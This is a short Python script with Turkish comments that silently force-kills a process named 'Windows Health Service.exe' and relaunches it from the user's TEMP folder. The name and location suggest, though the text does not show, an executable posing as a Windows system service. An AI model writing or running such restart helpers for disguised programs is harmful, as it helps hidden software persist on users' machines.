import os
import subprocess
import time
import sys

# Hedef dosya adı ve konumu
target_process_name = "Windows Health Service.exe"
temp_folder = os.environ.get('TEMP')
full_path = os.path.join(temp_folder, target_process_name)

def kill_process(process_name):
    """İşlemi standart kullanıcı yetkisiyle kapatmaya çalışır."""
    try:
        # taskkill komutunu sessizce (arka planda) çalıştırır
        subprocess.run(["taskkill", "/F", "/IM", process_name, "/T"], 
                       stdout=subprocess.DEVNULL, 
                       stderr=subprocess.DEVNULL)
        print(f"Bilgi: {process_name} kapatma komutu gönderildi.")
    except Exception as e:
        print(f"Hata: İşlem kapatılamadı: {e}")

def start_process(exe_path):
    """İşlemi standart kullanıcı yetkisiyle başlatır."""
    if os.path.exists(exe_path):
        try:
            # Popen kullanarak betik beklemek zorunda kalmadan başlatır
            subprocess.Popen([exe_path], shell=True)
            print(f"Bilgi: {exe_path} başlatıldı.")
        except Exception as e:
            print(f"Hata: Uygulama başlatılamadı: {e}")
    else:
        print("Hata: Hedef dosya TEMP klasöründe bulunamadı.")

if __name__ == "__main__":
    # 1. Adım: Mevcut işlemi kapat
    kill_process(target_process_name)
    
    # Kısa bir bekleme süresi
    time.sleep(2)
    
    # 2. Adım: İşlemi tekrar başlat
    start_process(full_path)

    sys.exit()
